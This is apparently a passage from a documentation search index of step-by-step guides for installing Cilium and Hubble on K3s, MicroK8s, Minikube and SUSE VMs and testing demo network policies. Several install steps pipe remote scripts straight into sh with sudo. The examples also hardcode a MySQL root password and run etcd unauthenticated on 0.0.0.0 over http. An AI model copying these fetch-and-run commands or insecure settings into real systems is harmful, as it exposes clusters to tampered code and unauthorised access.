apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels Apply the policy vim sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get cnp Violating the policy kubectl exec -it tiefighter -- curl -XPOST deathstar.default.svc.cluster.local/v1/request-landing kubectl exec -it tiefighter -- curl -XPOST deathstar.default.svc.cluster.local/v1/request SVC port forward to Monitor the logs kubectl -n kube-system port-forward svc/hubble-relay 4245 :80 Step 4: Install the Hubble CLI Client \u00b6 export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } Step 5: Monitoring the Cilium violation logs \u00b6 hubble observe -f --protocol http --label class = deathstar","title":"K3's Cluster"},{"location":"open-source/cilium/k3s/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on K3's by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/cilium/k3s/#step-1-install-k3s-on-linux","text":"curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = '--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644 export KUBECONFIG = /etc/rancher/k3s/k3s.yaml cp /etc/rancher/k3s/k3s.yaml ~/.kube/config systemctl status k3s which kubectl ; kubectl get nodes","title":"Step 1: Install K3's on Linux"},{"location":"open-source/cilium/k3s/#step-2-install-cilium","text":"curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin ; rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable cilium hubble enable Cilium Hubble Verify kubectl get pods -n kube-system | grep hubble","title":"Step 2: Install Cilium"},{"location":"open-source/cilium/k3s/#step-3-cilium-policy","text":"3.1: Create a tightfighter & deathstart deployment vim tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels Apply the policy vim sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get cnp Violating the policy kubectl exec -it tiefighter -- curl -XPOST deathstar.default.svc.cluster.local/v1/request-landing kubectl exec -it tiefighter -- curl -XPOST deathstar.default.svc.cluster.local/v1/request SVC port forward to Monitor the logs kubectl -n kube-system port-forward svc/hubble-relay 4245 :80","title":"Step 3: Cilium Policy"},{"location":"open-source/cilium/k3s/#step-4-install-the-hubble-cli-client","text":"export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"Step 4: Install the Hubble CLI Client"},{"location":"open-source/cilium/k3s/#step-5-monitoring-the-cilium-violation-logs","text":"hubble observe -f --protocol http --label class = deathstar","title":"Step 5: Monitoring the Cilium violation logs"},{"location":"open-source/cilium/microk8s/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on MicroK8's by applying policies on Kubernetes workloads. Step 1: Setup MicroK8's \u00b6 Clone the Repository: git clone https://github.com/kubearmor/KubeArmor.git cd KubeArmor/contribution/microk8s Run the script to set up MicroK8's Kubernetes: ./install_microk8s.sh kubectl get all -A Step 2: Cilium Install \u00b6 Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Above tradition installation method is not working as expected, so installing using Microk8's command. microk8s enable cilium cilium status Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install the Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } Step 3: Cilium Policy \u00b6 1. Create a Mysql deployment and Verify it vi mysql.yaml apiVersion : v1 kind : Service metadata : name : accuknox-mysql-haproxy spec : ports : - port : 3306 selector : app : mysql type : ClusterIP --- apiVersion : apps/v1 kind : Deployment metadata : name : accuknox-mysql spec : selector : matchLabels : app : mysql strategy : type : Recreate template : metadata : labels : app : mysql spec : containers : - image : mysql:8.0 name : mysql resources : requests : memory : 100M cpu : 100m # ephemeral-storage: 2G limits : memory : 1500M cpu : 1000m # ephemeral-storage: 2G env : # Use secret in real usage - name : MYSQL_ROOT_PASSWORD value : password ports : - containerPort : 3306 name : mysql volumeMounts : - name : mysql-persistent-storage mountPath : /var/lib/mysql volumes : - name : mysql-persistent-storage persistentVolumeClaim : claimName : mysql-pv-claim --- apiVersion : v1 kind : PersistentVolume metadata : name : mysql-pv-volume labels : type : local spec : storageClassName : standard capacity : storage : 2Gi accessModes : - ReadWriteOnce hostPath : path : \"/mnt/data\" --- apiVersion : v1 kind : PersistentVolumeClaim metadata : name : mysql-pv-claim spec : storageClassName : standard accessModes : - ReadWriteOnce resources : requests : storage : 2Gi kubectl apply -f mysql.yaml kubectl get pods kubectl get pods --show-labels 2. Apply the following policy vi cnp-mitre-t1571-mysql-ingress.yaml apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : cnp-mitre-t1571-mysql-ingress namespace : default #change default namespace to match your namespace spec : description : \"Allow ingress communication only through standard ports of MySQL pods\" endpointSelector : matchLabels : app : mysql # Change label with your own labels ingress : - toPorts : - ports : - port : \"3306\" protocol : TCP - port : \"33060\" protocol : TCP 3. Apply the policy kubectl apply -f cnp-mitre-t1571-mysql-ingress.yaml 4. Violating the policy kubectl get pod kubectl exec -it <mysql_pod>bash 5. Deleteing the policy kubectl delete cnp rule1-ingress","title":"MicroK8's Cluster"},{"location":"open-source/cilium/microk8s/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on MicroK8's by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/cilium/microk8s/#step-1-setup-microk8s","text":"Clone the Repository: git clone https://github.com/kubearmor/KubeArmor.git cd KubeArmor/contribution/microk8s Run the script to set up MicroK8's Kubernetes: ./install_microk8s.sh kubectl get all -A","title":"Step 1: Setup MicroK8's"},{"location":"open-source/cilium/microk8s/#step-2-cilium-install","text":"Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Above tradition installation method is not working as expected, so installing using Microk8's command. microk8s enable cilium cilium status Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install the Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"Step 2: Cilium Install"},{"location":"open-source/cilium/microk8s/#step-3-cilium-policy","text":"1. Create a Mysql deployment and Verify it vi mysql.yaml apiVersion : v1 kind : Service metadata : name : accuknox-mysql-haproxy spec : ports : - port : 3306 selector : app : mysql type : ClusterIP --- apiVersion : apps/v1 kind : Deployment metadata : name : accuknox-mysql spec : selector : matchLabels : app : mysql strategy : type : Recreate template : metadata : labels : app : mysql spec : containers : - image : mysql:8.0 name : mysql resources : requests : memory : 100M cpu : 100m # ephemeral-storage: 2G limits : memory : 1500M cpu : 1000m # ephemeral-storage: 2G env : # Use secret in real usage - name : MYSQL_ROOT_PASSWORD value : password ports : - containerPort : 3306 name : mysql volumeMounts : - name : mysql-persistent-storage mountPath : /var/lib/mysql volumes : - name : mysql-persistent-storage persistentVolumeClaim : claimName : mysql-pv-claim --- apiVersion : v1 kind : PersistentVolume metadata : name : mysql-pv-volume labels : type : local spec : storageClassName : standard capacity : storage : 2Gi accessModes : - ReadWriteOnce hostPath : path : \"/mnt/data\" --- apiVersion : v1 kind : PersistentVolumeClaim metadata : name : mysql-pv-claim spec : storageClassName : standard accessModes : - ReadWriteOnce resources : requests : storage : 2Gi kubectl apply -f mysql.yaml kubectl get pods kubectl get pods --show-labels 2. Apply the following policy vi cnp-mitre-t1571-mysql-ingress.yaml apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : cnp-mitre-t1571-mysql-ingress namespace : default #change default namespace to match your namespace spec : description : \"Allow ingress communication only through standard ports of MySQL pods\" endpointSelector : matchLabels : app : mysql # Change label with your own labels ingress : - toPorts : - ports : - port : \"3306\" protocol : TCP - port : \"33060\" protocol : TCP 3. Apply the policy kubectl apply -f cnp-mitre-t1571-mysql-ingress.yaml 4. Violating the policy kubectl get pod kubectl exec -it <mysql_pod>bash 5. Deleteing the policy kubectl delete cnp rule1-ingress","title":"Step 3: Cilium Policy"},{"location":"open-source/cilium/minikube/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on Minikube by applying policies on Kubernetes workloads. Step 1: Clone the Repository \u00b6 git clone https://github.com/kubearmor/KubeArmor.git Step 2: Install VirtualBox \u00b6 cd KubeArmor/contribution/minikube ./install_virtualbox.sh Note: Once VirtualBox installed, reboot the system. sudo reboot Step 3: Install Minikube \u00b6 cd KubeArmor/contribution/minikube ./install_minikube.sh ./start_minikube.sh Step 4: Cilium Installation \u00b6 Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium- linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install kubectl get pods -n kube-system | grep cilium cilium status --wait Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } Step 5: Getting Alerts/Telemetry from Cilium \u00b6 Enable port-forwarding for Cilium Hubble relay: cilium hubble port-forward & Step 6: Cilium Policy \u00b6 1. Create a tightfighter & deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Apply the following policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-egress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : tiefighter egress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get CiliumNetworkPolicy 3. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/test 4. Verifying the Cilium Violation logs hubble observe --pod tiefighter --protocol http","title":"Minikube Cluster"},{"location":"open-source/cilium/minikube/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on Minikube by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/cilium/minikube/#step-1-clone-the-repository","text":"git clone https://github.com/kubearmor/KubeArmor.git","title":"Step 1:  Clone the Repository"},{"location":"open-source/cilium/minikube/#step-2-install-virtualbox","text":"cd KubeArmor/contribution/minikube ./install_virtualbox.sh Note: Once VirtualBox installed, reboot the system. sudo reboot","title":"Step 2: Install VirtualBox"},{"location":"open-source/cilium/minikube/#step-3-install-minikube","text":"cd KubeArmor/contribution/minikube ./install_minikube.sh ./start_minikube.sh","title":"Step 3: Install Minikube"},{"location":"open-source/cilium/minikube/#step-4-cilium-installation","text":"Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium- linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install kubectl get pods -n kube-system | grep cilium cilium status --wait Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"Step 4: Cilium Installation"},{"location":"open-source/cilium/minikube/#step-5-getting-alertstelemetry-from-cilium","text":"Enable port-forwarding for Cilium Hubble relay: cilium hubble port-forward &","title":"Step 5: Getting Alerts/Telemetry from Cilium"},{"location":"open-source/cilium/minikube/#step-6-cilium-policy","text":"1. Create a tightfighter & deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Apply the following policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-egress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : tiefighter egress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get CiliumNetworkPolicy 3. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/test 4. Verifying the Cilium Violation logs hubble observe --pod tiefighter --protocol http","title":"Step 6: Cilium Policy"},{"location":"open-source/cilium/suse_les_15/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on VM workloads. Step 1: Install etcd in control plane VM \u00b6 Create etcd user: groupadd --system etcd useradd --home-dir \"/var/lib/etcd\" \\ --system \\ --shell /bin/false \\ -g etcd \\ etcd Create the necessary directories: mkdir -p /etc/etcd chown etcd:etcd /etc/etcd mkdir -p /var/lib/etcd chown etcd:etcd /var/lib/etcd Determine your system architecture: uname -m Download and Install the etcd tarball for x86_64/amd64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } /etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Or Download and Install the etcd tarball for arm64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } /etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Create and Edit the .yaml file: sudo vi /etc/etcd/etcd.conf.yaml name : controller data-dir : /var/lib/etcd initial-cluster-state : 'new' initial-cluster-token : 'etcd-cluster-01' initial-cluster : controller=http://0.0.0.0:2380 initial-advertise-peer-urls : http://0.0.0.0:2380 advertise-client-urls : http://0.0.0.0:2379 listen-peer-urls : http://0.0.0.0:2380 listen-client-urls : http://0.0.0.0:2379 Create and Edit the .service file: sudo vi /usr/lib/systemd/system/etcd.service [ Unit ] After=network.target Description=etcd - highly-available key value store [Service] # Uncomment this on ARM64. # Environment=\"ETCD_UNSUPPORTED_ARCH=arm64\" LimitNOFILE=65536 Restart=on-failure Type=notify ExecStart=/usr/bin/etcd --config-file /etc/etcd/etcd.conf.yml User=etcd [Install] WantedBy=multi-user.target Reload systemd service files with: systemctl daemon-reload Enable and Start the etcd service: systemctl enable etcd systemctl start etcd systemctl status etcd Step 2: Install KVM-Service in control plane VM \u00b6 Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.rpm zypper install kvmservice_0.1_linux-amd64.rpm systemctl status kvmservice Step 3: Install Karmor in control plane VM \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list Step 5: Generate Installation scripts for configured worker VMs \u00b6 Generate VM installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1 Step 6: Execute the Installation script in VMs \u00b6 Note: Docker needs to Install before running the script. vi testvm1.sh Comment the following line on script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Note: Upcoming release will fix the above comment section. Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can verify by running following command: sudo docker ps Step 7: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Step 8: Policy Violation on worker node \u00b6 curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"SUSE Linux Enterprise Server 15"},{"location":"open-source/cilium/suse_les_15/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/cilium/suse_les_15/#step-1-install-etcd-in-control-plane-vm","text":"Create etcd user: groupadd --system etcd useradd --home-dir \"/var/lib/etcd\" \\ --system \\ --shell /bin/false \\ -g etcd \\ etcd Create the necessary directories: mkdir -p /etc/etcd chown etcd:etcd /etc/etcd mkdir -p /var/lib/etcd chown etcd:etcd /var/lib/etcd Determine your system architecture: uname -m Download and Install the etcd tarball for x86_64/amd64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } /etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Or Download and Install the etcd tarball for arm64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } /etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Create and Edit the .yaml file: sudo vi /etc/etcd/etcd.conf.yaml name : controller data-dir : /var/lib/etcd initial-cluster-state : 'new' initial-cluster-token : 'etcd-cluster-01' initial-cluster : controller=http://0.0.0.0:2380 initial-advertise-peer-urls : http://0.0.0.0:2380 advertise-client-urls : http://0.0.0.0:2379 listen-peer-urls : http://0.0.0.0:2380 listen-client-urls : http://0.0.0.0:2379 Create and Edit the .service file: sudo vi /usr/lib/systemd/system/etcd.service [ Unit ] After=network.target Description=etcd - highly-available key value store [Service] # Uncomment this on ARM64. # Environment=\"ETCD_UNSUPPORTED_ARCH=arm64\" LimitNOFILE=65536 Restart=on-failure Type=notify ExecStart=/usr/bin/etcd --config-file /etc/etcd/etcd.conf.yml User=etcd [Install] WantedBy=multi-user.target Reload systemd service files with: systemctl daemon-reload Enable and Start the etcd service: systemctl enable etcd systemctl start etcd systemctl status etcd","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/cilium/suse_les_15/#step-2-install-kvm-service-in-control-plane-vm","text":"Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.rpm zypper install kvmservice_0.1_linux-amd64.rpm systemctl status kvmservice","title":"Step 2: Install KVM-Service in control plane VM"},{"location":"open-source/cilium/suse_les_15/#step-3-install-karmor-in-control-plane-vm","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane VM"},{"location":"open-source/cilium/suse_les_15/#step-4-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/cilium/suse_les_15/#step-5-generate-installation-scripts-for-configured-worker-vms","text":"Generate VM installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1","title":"Step 5: Generate Installation scripts for configured worker VMs"},{"location":"open-source/cilium/suse_les_15/#step-6-execute-the-installation-script-in-vms","text":"Note: Docker needs to Install before running the script. vi testvm1.sh Comment the following line on script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Note: Upcoming release will fix the above comment section. Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can verify by running following command: sudo docker ps","title":"Step 6: Execute the Installation script in VMs"},{"location":"open-source/cilium/suse_les_15/#step-7-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to 